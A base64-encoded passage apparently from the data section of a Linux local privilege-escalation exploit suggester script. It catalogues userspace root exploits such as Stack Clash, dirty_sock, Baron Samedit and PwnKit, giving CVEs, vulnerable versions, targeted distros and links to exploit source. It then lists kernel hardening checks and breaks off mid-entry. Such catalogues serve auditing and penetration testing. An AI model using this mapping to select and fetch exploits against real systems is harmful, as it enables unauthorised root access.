Y2xhc2gvc3RhY2stY2xhc2gudHh0CnNyYy11cmw6IGh0dHBzOi8vd3d3LnF1YWx5cy5jb20vMjAxNy8wNi8xOS9zdGFjay1jbGFzaC9saW51eF9sZHNvX2R5bmFtaWMuYwpleHBsb2l0LWRiOiA0MjI3NgphdXRob3I6IFF1YWx5cwpDb21tZW50czogVXNlcyAiU3RhY2sgQ2xhc2giIHRlY2huaXF1ZSwgd29ya3MgYWdhaW5zdCBtb3N0IFNVSUQtcm9vdCBQSUVzCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE3LTEwMDAzNjYsQ1ZFLTIwMTctMTAwMDM3OV0ke3R4dHJzdH0gbGludXhfbGRzb19od2NhcF82NApSZXFzOiBwa2c9Z2xpYmN8bGliYzYsdmVyPD0yLjI1LHg4Nl82NApUYWdzOiBkZWJpYW49Ny43fDguNXw5LjAsdWJ1bnR1PTE0LjA0LjJ8MTYuMDQuMnwxNy4wNCxmZWRvcmE9MjJ8MjUsY2VudG9zPTcuMy4xNjExClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3d3dy5xdWFseXMuY29tLzIwMTcvMDYvMTkvc3RhY2stY2xhc2gvc3RhY2stY2xhc2gudHh0CnNyYy11cmw6IGh0dHBzOi8vd3d3LnF1YWx5cy5jb20vMjAxNy8wNi8xOS9zdGFjay1jbGFzaC9saW51eF9sZHNvX2h3Y2FwXzY0LmMKZXhwbG9pdC1kYjogNDIyNzUKYXV0aG9yOiBRdWFseXMKQ29tbWVudHM6IFVzZXMgIlN0YWNrIENsYXNoIiB0ZWNobmlxdWUsIHdvcmtzIGFnYWluc3QgbW9zdCBTVUlELXJvb3QgYmluYXJpZXMKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTctMTAwMDM3MCxDVkUtMjAxNy0xMDAwMzcxXSR7dHh0cnN0fSBsaW51eF9vZmZzZXQybGliClJlcXM6IHBrZz1nbGliY3xsaWJjNix2ZXI8PTIuMjUseDg2ClRhZ3M6ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3d3dy5xdWFseXMuY29tLzIwMTcvMDYvMTkvc3RhY2stY2xhc2gvc3RhY2stY2xhc2gudHh0CnNyYy11cmw6IGh0dHBzOi8vd3d3LnF1YWx5cy5jb20vMjAxNy8wNi8xOS9zdGFjay1jbGFzaC9saW51eF9vZmZzZXQybGliLmMKZXhwbG9pdC1kYjogNDIyNzMKYXV0aG9yOiBRdWFseXMKQ29tbWVudHM6IFVzZXMgIlN0YWNrIENsYXNoIiB0ZWNobmlxdWUKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTgtMTAwMDAwMV0ke3R4dHJzdH0gUmF0aW9uYWxMb3ZlClJlcXM6IHBrZz1nbGliY3xsaWJjNix2ZXI8Mi4yNyxDT05GSUdfVVNFUl9OUz15LHN5c2N0bDprZXJuZWwudW5wcml2aWxlZ2VkX3VzZXJuc19jbG9uZT09MSx4ODZfNjQKVGFnczogZGViaWFuPTl7bGliYzY6Mi4yNC0xMStkZWI5dTF9LHVidW50dT0xNi4wNC4ze2xpYmM2OjIuMjMtMHVidW50dTl9ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3d3dy5oYWxmZG9nLm5ldC9TZWN1cml0eS8yMDE3L0xpYmNSZWFscGF0aEJ1ZmZlclVuZGVyZmxvdy8Kc3JjLXVybDogaHR0cHM6Ly93d3cuaGFsZmRvZy5uZXQvU2VjdXJpdHkvMjAxNy9MaWJjUmVhbHBhdGhCdWZmZXJVbmRlcmZsb3cvUmF0aW9uYWxMb3ZlLmMKQ29tbWVudHM6IGtlcm5lbC51bnByaXZpbGVnZWRfdXNlcm5zX2Nsb25lPTEgcmVxdWlyZWQKYmluLXVybDogaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LWZyYW1ld29yay9tYXN0ZXIvZGF0YS9leHBsb2l0cy9jdmUtMjAxOC0xMDAwMDAxL1JhdGlvbmFsTG92ZQpleHBsb2l0LWRiOiA0Mzc3NQphdXRob3I6IGhhbGZkb2cKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTgtMTA5MDBdJHt0eHRyc3R9IHZwbmNfcHJpdmVzYy5weQpSZXFzOiBwa2c9bmV0d29ya21hbmFnZXItdnBuY3xuZXR3b3JrLW1hbmFnZXItdnBuYyx2ZXI8MS4yLjYKVGFnczogdWJ1bnR1PTE2LjA0e25ldHdvcmstbWFuYWdlci12cG5jOjEuMS45My0xfSxkZWJpYW49OS4we25ldHdvcmstbWFuYWdlci12cG5jOjEuMi40LTR9LG1hbmphcm89MTcKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vcHVsc2VzZWN1cml0eS5jby5uei9hZHZpc29yaWVzL05NLVZQTkMtUHJpdmVzYwpzcmMtdXJsOiBodHRwczovL2J1Z3ppbGxhLm5vdmVsbC5jb20vYXR0YWNobWVudC5jZ2k/aWQ9Nzc5MTEwCmV4cGxvaXQtZGI6IDQ1MzEzCmF1dGhvcjogRGVuaXMgQW5kemFrb3ZpYwpDb21tZW50czogRGlzdHJvcyB1c2Ugb3duIHZlcnNpb25pbmcgc2NoZW1lLiBNYW51YWwgdmVyaWZpY2F0aW9uIG5lZWRlZC4KRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTgtMTQ2NjVdJHt0eHRyc3R9IHJhcHRvcl94b3JneQpSZXFzOiBwa2c9eG9yZy14MTEtc2VydmVyLVhvcmcsY21kOlsgLXUgL3Vzci9iaW4vWG9yZyBdClRhZ3M6IGNlbnRvcz03LjQKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vd3d3LnNlY3VyZXBhdHRlcm5zLmNvbS8yMDE4LzEwL2N2ZS0yMDE4LTE0NjY1LXhvcmcteC1zZXJ2ZXIuaHRtbApleHBsb2l0LWRiOiA0NTkyMgphdXRob3I6IHJhcHRvcgpDb21tZW50czogWC5PcmcgU2VydmVyIGJlZm9yZSAxLjIwLjMgaXMgdnVsbmVyYWJsZS4gRGlzdHJvcyB1c2Ugb3duIHZlcnNpb25pbmcgc2NoZW1lLiBNYW51YWwgdmVyaWZpY2F0aW9uIG5lZWRlZC4KRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTktNzMwNF0ke3R4dHJzdH0gZGlydHlfc29jawpSZXFzOiBwa2c9c25hcGQsdmVyPDIuMzcsY21kOlsgLVMgL3J1bi9zbmFwZC5zb2NrZXQgXQpUYWdzOiB1YnVudHU9MTguMTAsbWludD0xOQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9pbml0YmxvZy5jb20vMjAxOS9kaXJ0eS1zb2NrLwpleHBsb2l0LWRiOiA0NjM2MQpleHBsb2l0LWRiOiA0NjM2MgpzcmMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vaW5pdHN0cmluZy9kaXJ0eV9zb2NrL2FyY2hpdmUvbWFzdGVyLnppcAphdXRob3I6IEluaXRTdHJpbmcKQ29tbWVudHM6IERpc3Ryb3MgdXNlIG93biB2ZXJzaW9uaW5nIHNjaGVtZS4gTWFudWFsIHZlcmlmaWNhdGlvbiBuZWVkZWQuCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE5LTEwMTQ5XSR7dHh0cnN0fSByYXB0b3JfZXhpbV93aXoKUmVxczogcGtnPWV4aW18ZXhpbTQsdmVyPj00Ljg3LHZlcjw9NC45MQpUYWdzOgpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly93d3cucXVhbHlzLmNvbS8yMDE5LzA2LzA1L2N2ZS0yMDE5LTEwMTQ5L3JldHVybi13aXphcmQtcmNlLWV4aW0udHh0CmV4cGxvaXQtZGI6IDQ2OTk2CmF1dGhvcjogcmFwdG9yCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE5LTEyMTgxXSR7dHh0cnN0fSBTZXJ2LVUgRlRQIFNlcnZlcgpSZXFzOiBjbWQ6WyAtdSAvdXNyL2xvY2FsL1NlcnYtVS9TZXJ2LVUgXQpUYWdzOiBkZWJpYW49OQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9ibG9nLnZhc3RhcnQuZGV2LzIwMTkvMDYvY3ZlLTIwMTktMTIxODEtc2Vydi11LWV4cGxvaXQtd3JpdGV1cC5odG1sCmV4cGxvaXQtZGI6IDQ3MDA5CnNyYy11cmw6IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9ndXl3aGF0YWd1eS9DVkUtMjAxOS0xMjE4MS9tYXN0ZXIvc2VydnUtcGUtY3ZlLTIwMTktMTIxODEuYwpleHQtdXJsOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYmNvbGVzL2xvY2FsLWV4cGxvaXRzL21hc3Rlci9DVkUtMjAxOS0xMjE4MS9TVXJvb3QKYXV0aG9yOiBHdXkgTGV2aW4gKG9yZ2luYWwgZXhwbG9pdCBhdXRob3IpOyBCcmVuZGFuIENvbGVzIChhdXRob3Igb2YgZXhwbG9pdCB1cGRhdGUgYXQgJ2V4dC11cmwnKQpDb21tZW50czogTW9kaWZpZWQgdmVyc2lvbiBhdCAnZXh0LXVybCcgdXNlcyBiYXNoIGV4ZWMgdGVjaG5pcXVlLCByYXRoZXIgdGhhbiBjb21waWxpbmcgd2l0aCBnY2MuCkVPRgopCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTktMTg4NjJdJHt0eHRyc3R9IEdOVSBNYWlsdXRpbHMgMi4wIDw9IDMuNyBtYWlkYWcgdXJsIGxvY2FsIHJvb3QgKENWRS0yMDE5LTE4ODYyKQpSZXFzOiBjbWQ6WyAtdSAvdXNyL2xvY2FsL3NiaW4vbWFpZGFnIF0KVGFnczogClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3d3dy5taWtlLWd1YWx0aWVyaS5jb20vcG9zdHMvZmluZGluZy1hLWRlY2FkZS1vbGQtZmxhdy1pbi1nbnUtbWFpbHV0aWxzCmV4dC11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9iY29sZXMvbG9jYWwtZXhwbG9pdHMvcmF3L21hc3Rlci9DVkUtMjAxOS0xODg2Mi9leHBsb2l0LmNyb24uc2gKc3JjLXVybDogaHR0cHM6Ly9naXRodWIuY29tL2Jjb2xlcy9sb2NhbC1leHBsb2l0cy9yYXcvbWFzdGVyL0NWRS0yMDE5LTE4ODYyL2V4cGxvaXQubGRwcmVsb2FkLnNoCmF1dGhvcjogYmNvbGVzCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE5LTE4NjM0XSR7dHh0cnN0fSBzdWRvIHB3ZmVlZGJhY2sKUmVxczogcGtnPXN1ZG8sdmVyPDEuOC4zMQpUYWdzOiBtaW50PTE5ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL2R5bGFua2F0ei5jb20vQW5hbHlzaXMtb2YtQ1ZFLTIwMTktMTg2MzQvCnNyYy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9zYWxlZW1yYXNoaWQvc3Vkby1jdmUtMjAxOS0xODYzNC9yYXcvbWFzdGVyL2V4cGxvaXQuYwphdXRob3I6IHNhbGVlbXJhc2hpZApDb21tZW50czogc3VkbyBjb25maWd1cmF0aW9uIHJlcXVpcmVzIHB3ZmVlZGJhY2sgdG8gYmUgZW5hYmxlZC4KRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMjAtOTQ3MF0ke3R4dHJzdH0gV2luZyBGVFAgU2VydmVyIDw9IDYuMi41IExQRQpSZXFzOiBjbWQ6WyAteCAvZXRjL2luaXQuZC93ZnRwc2VydmVyIF0KVGFnczogdWJ1bnR1PTE4ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3d3dy5ob29wZXJsYWJzLnh5ei9kaXNjbG9zdXJlcy9jdmUtMjAyMC05NDcwLnBocApzcmMtdXJsOiBodHRwczovL3d3dy5ob29wZXJsYWJzLnh5ei9kaXNjbG9zdXJlcy9jdmUtMjAyMC05NDcwLnNoCmV4cGxvaXQtZGI6IDQ4MTU0CmF1dGhvcjogQ2FyeSBDb29wZXIKQ29tbWVudHM6IFJlcXVpcmVzIGFuIGFkbWluaXN0cmF0b3IgdG8gbG9naW4gdmlhIHRoZSB3ZWIgaW50ZXJmYWNlLgpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAyMS0zMTU2XSR7dHh0cnN0fSBzdWRvIEJhcm9uIFNhbWVkaXQKUmVxczogcGtnPXN1ZG8sdmVyPDEuOS41cDIKVGFnczogbWludD0xOSx1YnVudHU9MTh8MjAsIGRlYmlhbj0xMApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly93d3cucXVhbHlzLmNvbS8yMDIxLzAxLzI2L2N2ZS0yMDIxLTMxNTYvYmFyb24tc2FtZWRpdC1oZWFwLWJhc2VkLW92ZXJmbG93LXN1ZG8udHh0CnNyYy11cmw6IGh0dHBzOi8vY29kZWxvYWQuZ2l0aHViLmNvbS9ibGFzdHkvQ1ZFLTIwMjEtMzE1Ni96aXAvbWFpbgphdXRob3I6IGJsYXN0eQpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAyMS0zMTU2XSR7dHh0cnN0fSBzdWRvIEJhcm9uIFNhbWVkaXQgMgpSZXFzOiBwa2c9c3Vkbyx2ZXI8MS45LjVwMgpUYWdzOiBjZW50b3M9Nnw3fDgsdWJ1bnR1PTE0fDE2fDE3fDE4fDE5fDIwLCBkZWJpYW49OXwxMApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly93d3cucXVhbHlzLmNvbS8yMDIxLzAxLzI2L2N2ZS0yMDIxLTMxNTYvYmFyb24tc2FtZWRpdC1oZWFwLWJhc2VkLW92ZXJmbG93LXN1ZG8udHh0CnNyYy11cmw6IGh0dHBzOi8vY29kZWxvYWQuZ2l0aHViLmNvbS93b3Jhd2l0L0NWRS0yMDIxLTMxNTYvemlwL21haW4KYXV0aG9yOiB3b3Jhd2l0CkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE3LTU2MThdJHt0eHRyc3R9IHNldHVpZCBzY3JlZW4gdjQuNS4wIExQRQpSZXFzOiBwa2c9c2NyZWVuLHZlcj09NC41LjAKVGFnczogClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3NlY2xpc3RzLm9yZy9vc3Mtc2VjLzIwMTcvcTEvMTg0CmV4cGxvaXQtZGI6IGh0dHBzOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzQxMTU0CkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDIxLTQwMzRdJHt0eHRyc3R9IFB3bktpdApSZXFzOiBwa2c9cG9sa2l0fHBvbGljeWtpdC0xLHZlcjw9MC4xMDUtMzEKVGFnczogdWJ1bnR1PTEwfDExfDEyfDEzfDE0fDE1fDE2fDE3fDE4fDE5fDIwfDIxLGRlYmlhbj03fDh8OXwxMHwxMSxmZWRvcmEsbWFuamFybwpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly93d3cucXVhbHlzLmNvbS8yMDIyLzAxLzI1L2N2ZS0yMDIxLTQwMzQvcHdua2l0LnR4dApzcmMtdXJsOiBodHRwczovL2NvZGVsb2FkLmdpdGh1Yi5jb20vYmVyZGF2L0NWRS0yMDIxLTQwMzQvemlwL21haW4KYXV0aG9yOiBiZXJkYXYKRU9GCikKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMjIHNlY3VyaXR5IHJlbGF0ZWQgSFcva2VybmVsIGZlYXR1cmVzCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCm49MAoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKc2VjdGlvbjogTWFpbmxpbmUga2VybmVsIHByb3RlY3Rpb24gbWVjaGFuaXNtczoKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IEtlcm5lbCBQYWdlIFRhYmxlIElzb2xhdGlvbiAoUFRJKSBzdXBwb3J0CmF2YWlsYWJsZTogdmVyPj00LjE1CmVuYWJsZWQ6IGNtZDpncmVwIC1FcWkgJ1xzcHRpJyAvcHJvYy9jcHVpbmZvCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvcHRpLm1kCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBHQ0Mgc3RhY2sgcHJvdGVjdG9yIHN1cHBvcnQKYXZhaWxhYmxlOiBDT05GSUdfSEFWRV9TVEFDS1BST1RFQ1RPUj15CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvc3RhY2twcm90ZWN0b3ItcmVndWxhci5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogR0NDIHN0YWNrIHByb3RlY3RvciBTVFJPTkcgc3VwcG9ydAphdmFpbGFibGU6IENPTkZJR19TVEFDS1BST1RFQ1RPUl9TVFJPTkc9eSx2ZXI+PTMuMTQKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9zdGFja3Byb3RlY3Rvci1zdHJvbmcubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IExvdyBhZGRyZXNzIHNwYWNlIHRvIHByb3RlY3QgZnJvbSB1c2VyIGFsbG9jYXRpb24KYXZhaWxhYmxlOiBDT05GSUdfREVGQVVMVF9NTUFQX01JTl9BRERSPVswLTldKwplbmFibGVkOiBzeXNjdGw6dm0ubW1hcF9taW5fYWRkciE9MAphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL21tYXBfbWluX2FkZHIubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IFByZXZlbnQgdXNlcnMgZnJvbSB1c2luZyBwdHJhY2UgdG8gZXhhbWluZSB0aGUgbWVtb3J5IGFuZCBzdGF0ZSBvZiB0aGVpciBwcm9jZXNzZXMKYXZhaWxhYmxlOiBDT05GSUdfU0VDVVJJVFlfWUFNQT15CmVuYWJsZWQ6IHN5c2N0bDprZXJuZWwueWFtYS5wdHJhY2Vfc2NvcGUhPTAKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy95YW1hX3B0cmFjZV9zY29wZS5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogUmVzdHJpY3QgdW5wcml2aWxlZ2VkIGFjY2VzcyB0byBrZXJuZWwgc3lzbG9nCmF2YWlsYWJsZTogQ09ORklHX1NFQ1VSSVRZX0RNRVNHX1JFU1RSSUNUPXksdmVyPj0yLjYuMzcKZW5hYmxlZDogc3lzY3RsOmtlcm5lbC5kbWVzZ19yZXN0cmljdCE9MAphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL2RtZXNnX3Jlc3RyaWN0Lm1kCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBSYW5kb21pemUgdGhlIGFkZHJlc3Mgb2YgdGhlIGtlcm5lbCBpbWFnZSAoS0FTTFIpCmF2YWlsYWJsZTogQ09ORklHX1JBTkRPTUlaRV9CQVNFPXkKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9rYXNsci5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogSGFyZGVuZWQgdXNlciBjb3B5IHN1cHBvcnQKYXZhaWxhYmxlOiBDT05GSUdfSEFSREVORURfVVNFUkNPUFk9eQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL2hhcmRlbmVkX3VzZXJjb3B5Lm1kCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBNYWtlIGtlcm5lbCB0ZXh0IGFuZCByb2RhdGEgcmVhZC1vbmx5CmF2YWlsYWJsZTogQ09ORklHX1NUUklDVF9LRVJORUxfUldYPXkKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9zdHJpY3Rfa2VybmVsX3J3eC5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogU2V0IGxvYWRhYmxlIGtlcm5lbCBtb2R1bGUgZGF0YSBhcyBOWCBhbmQgdGV4dCBhcyBSTwphdmFpbGFibGU6IENPTkZJR19TVFJJQ1RfTU9EVUxFX1JXWD15CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvc3RyaWN0X21vZHVsZV9yd3gubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IEJVRygpIGNvbmRpdGlvbnMgcmVwb3J0aW5nCmF2YWlsYWJsZTogQ09ORklHX0JVRz15CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvYnVnLm1kCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBBZGRpdGlvbmFsICdjcmVkJyBzdHJ1Y3QgY2hlY2tzCmF2YWlsYWJsZTogQ09ORklHX0RFQlVHX0NSRURFTlRJQUxTPXkKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9kZWJ1Z19jcmVkZW50aWFscy5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogU2FuaXR5IGNoZWNrcyBmb3Igbm90aWZpZXIgY2FsbCBjaGFpbnMKYXZhaWxhYmxlOiBDT05GSUdfREVCVUdfTk9USUZJRVJTPXkKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9kZWJ1Z19ub3RpZmllcnMubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IEV4dGVuZGVkIGNoZWNrcyBmb3IgbGlua2VkLWxpc3RzIHdhbGtpbmcKYXZhaWxhYmxlOiBDT05GSUdfREVCVUdfTElTVD15CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvZGVidWdfbGlzdC5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogQ2hlY2tzIG9uIHNjYXR0ZXItZ2F0aGVyIHRhYmxlcwphdmFpbGFibGU6IENPTkZJR19ERUJVR19TRz15CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvZGVidWdfc2cubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IENoZWNrcyBmb3IgZGF0YSBzdHJ1Y3R1cmUgY29ycnVwdGlvbnMKYXZhaWxhYmxlOiBDT05GSUdfQlVHX09OX0RBVEFfQ09SUlVQVElPTj15CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvYnVnX29uX2RhdGFfY29ycnVwdGlvbi5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogQ2hlY2tzIGZvciBhIHN0YWNrIG92ZXJydW4gb24gY2FsbHMgdG8gJ3NjaGVkdWxlJwphdmFpbGFibGU6IENPTkZJR19TQ0hFRF9TVEFDS19FTkRfQ0hFQ0s9eQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL3NjaGVkX3N0YWNrX2VuZF9jaGVjay5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogRnJlZWxpc3Qgb3JkZXIgcmFuZG9taXphdGlvbiBvbiBuZXcgcGFnZXMgY3JlYXRpb24KYXZhaWxhYmxlOiBDT05GSUdfU0xBQl9GUkVFTElTVF9SQU5ET009eQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL3NsYWJfZnJlZWxpc3RfcmFuZG9tLm1kCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBGcmVlbGlzdCBtZXRhZGF0YSBoYXJkZW5pbmcKYXZhaWxhYmxlOiBDT05GSUdfU0xBQl9GUkVFTElTVF9IQVJERU5FRD15CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvc2xhYl9mcmVlbGlzdF9oYXJkZW5lZC5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogQWxsb2NhdG9yIHZhbGlkYXRpb24gY2hlY2tpbmcKYXZhaWxhYmxlOiBDT05GSUdfU0xVQl9ERUJVR19PTj15LGNtZDohIGdyZXAgJ3NsdWJfZGVidWc9LScgL3Byb2MvY21kbGluZQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL3NsdWJfZGVidWcubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IFZpcnR1YWxseS1tYXBwZWQga2VybmVsIHN0YWNrcyB3aXRoIGd1YXJkIHBhZ2VzCmF2YWlsYWJsZTogQ09ORklHX1ZNQVBfU1RBQ0s9eQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL3ZtYXBfc3RhY2subWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IFBhZ2VzIHBvaXNvbmluZyBhZnRlciBm